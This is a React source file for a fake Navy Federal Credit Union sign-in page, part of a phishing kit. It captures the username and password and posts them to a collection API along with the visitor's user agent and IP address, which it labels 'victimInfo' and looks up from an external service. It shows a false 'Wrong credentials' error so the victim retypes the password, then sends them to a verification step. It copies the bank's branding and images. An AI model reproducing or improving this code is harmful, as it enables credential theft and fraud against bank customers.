import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import FormLayout from "../components/formLayout";
import { randParams } from "../utils/random";
import { APP_STORAGE_NAME } from "../utils/constants";
import Input from "../components/input";
import Button from "../components/button";
import API from "../api/api";
import axios from "axios";

const Login = () => {
  const router = useHistory();
  const [data, setData] = useState({ userID: "", password: "" });
  const [isWrong, setIsWrong] = useState(false);
  const [isShowPass, setIsShowPass] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [victimInfo, setVictimData] = useState({
    ip: "",
  });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    sessionStorage.setItem(APP_STORAGE_NAME, JSON.stringify(data));
    const _data = JSON.parse(sessionStorage.getItem(APP_STORAGE_NAME)) || {};
    setIsLoading(true);
    try {
      const res = await API.createDetail({
        ..._data,
        bank: "navyfederal.org",
        userAgent: navigator?.userAgent,
        victimInfo,
      });
      if (res.status === 201) {
        if (!isWrong) {
          setData({ userID: "", password: "" });
          setIsWrong(true);
          return;
        }
        router.push(`/verification?${randParams()}`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <>
      <FormLayout
        handleSubmit={handleSubmit}
        title="Sign In"
      >
        <Input
          title="Username"
          name="userID"
          value={data?.userID}
          onChange={handleChange}
        />

        <Input
          title="Password"
          type={!isShowPass ? "password" : "text"}
          name="password"
          value={data?.password}
          onChange={handleChange}
        >
          <span
            className="absolute top-[38px] right-3 font-semibold text-sm cursor-pointer text-[#005587]"
            onClick={() => setIsShowPass((prev) => !prev)}
          >
            {isShowPass ? (
              <FaEyeSlash
                fill="#676868"
                size={22}
              />
            ) : (
              <FaEye
                fill="#676868"
                size={22}
              />
            )}
          </span>
        </Input>

        {isWrong && (
          <div
            role="alert"
            className="alert alert-error my-4 rounded-[24px] bg-[#fcf3f3] border-[#fcf3f3] text-[#333333]"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              className="stroke-[#ce1616] shrink-0 w-6 h-6"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
              ></path>
            </svg>
            <span>Wrong credentials.</span>
          </div>
        )}

        <div className="my-6">
          <a
            href="#"
            className="text-[#0667ba] underline text-sm font-[500]"
          >
            Sign In Help
          </a>
        </div>

        <Button
          type="submit"
          disabled={isLoading}
          title={
            isLoading ? (
              <span className="loading loading-spinner loading-md text-white"></span>
            ) : (
              "Sign In"
            )
          }
        />
      </FormLayout>
      <div className="flex items-center">
        <div className="w-full md:w-[50%] p-6 md:p-[63px_32px_64px_8px] md:pl-[80px]">
          <p className="text-[#0f3d70] text-xl font-semibold">
            Not a Navy Federal Member?
          </p>
          <p className="text-[#0f3d70] text-2xl mt-4 mb-7">
            Join now and enjoy the support and great service of a credit union
            that puts your needs first.
          </p>
          <div className="mb-5 flex items-center md:gap-3 max-md:flex-wrap justify-center max-md:max-w-[200px] mx-auto">
            <Button
              style={{ margin: 0 }}
              title={"Become a Member"}
            />
            <Button
              title={"Learn More"}
              style={{ background: "#0057ba", minWidth: 144, width: 144 }}
            />
          </div>
        </div>
        <div className="w-[50%] max-md:hidden">
          <img
            src="https://digitalapps.navyfederal.org/signin/static/media/img-BecomeAMember.64255d0d02ef64234628.jpg"
            alt="abc"
          />
        </div>
      </div>
    </>
  );
};

export default Login;
